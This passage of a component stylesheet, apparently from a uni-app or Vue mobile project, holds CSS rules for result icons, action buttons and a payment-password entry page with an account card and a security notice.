.sp-icon-circle {
  width: 160rpx;
  height: 160rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 40rpx;
}

.sp-icon-error {
  background: #fce4e4;
}

.sp-icon-success {
  background: #e0f7fa;
}

.sp-icon-warning {
  background: #fff8e1;
}

.sp-icon-symbol {
  font-size: 72rpx;
  font-weight: 700;
}

.sp-icon-error .sp-icon-symbol {
  color: #e53935;
}

.sp-icon-success .sp-icon-symbol {
  color: #00c4d0;
}

.sp-icon-warning .sp-icon-symbol {
  color: #f9a825;
}

.sp-result-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  margin-bottom: 16rpx;
}

.sp-color-error {
  color: #e53935;
}

.sp-color-success {
  color: #00c4d0;
}

.sp-color-warning {
  color: #f9a825;
}

.sp-result-message {
  display: block;
  font-size: 30rpx;
  color: #4a4a4a;
  margin-bottom: 12rpx;
  font-weight: 500;
  line-height: 1.5;
}

.sp-result-desc {
  display: block;
  font-size: 26rpx;
  color: #9e9e9e;
  line-height: 1.6;
  max-width: 520rpx;
}

.sp-action-btn {
  width: 100%;
  height: 104rpx;
  border-radius: 52rpx;
  font-size: 34rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.sp-action-btn::after {
  border: none;
}

.sp-btn-error {
  background: #e53935;
}

.sp-btn-success {
  background: #00c4d0;
}

.sp-btn-warning {
  background: #f9a825;
  color: #1a1a1a;
}

/* ========== 支付密码页面 ========== */
.sp-account-card {
  margin-bottom: 32rpx;
}

.sp-account-label {
  display: block;
  font-size: 26rpx;
  color: #9e9e9e;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.sp-account-box {
  background: #FFFFFF;
  border-radius: 16rpx;
  padding: 24rpx;
  border: 2rpx solid #e0e0e0;
}

.sp-account-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12rpx 0;
  border-bottom: 1rpx solid #f0f0f0;

  &:last-child {
    border-bottom: none;
  }
}

.sp-row-label {
  font-size: 26rpx;
  color: #9e9e9e;
}

.sp-row-value {
  font-size: 28rpx;
  font-weight: 600;
  color: #1a1a1a;
}

.sp-password-section {
  margin-bottom: 32rpx;
}

.sp-pwd-label {
  display: block;
  font-size: 28rpx;
  color: #4a4a4a;
  margin-bottom: 16rpx;
}

.sp-pwd-input {
  width: 100%;
  height: 96rpx;
  background: #FFFFFF;
  border: 2rpx solid #e0e0e0;
  border-radius: 12rpx;
  padding: 0 32rpx;
  font-size: 32rpx;
  color: #1a1a1a;

  &:focus {
    border-color: #00c4d0;
  }
}

.sp-security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #e0f7fa;
  border-radius: 16rpx;
}

.sp-shield-icon {
  font-size: 40rpx;
  color: #00c4d0;
  flex-shrink: 0;
  margin-top: 4rpx;
}

.sp-notice-body {
  flex: 1;
}

.sp-notice-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #00838f;
  margin-bottom: 8rpx;
}

.sp-notice-text {
  display: block;
  font-size: 24rpx;
  color: #00838f;
  line-height: 1.5;
}

.sp-submit-btn {
  width: 100%;
  height: 104rpx;
  background: #00c4d0;
  border-radius: 52rpx;
  font-size: 34rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.sp-submit-btn::after {
  border: none;
}
</style>
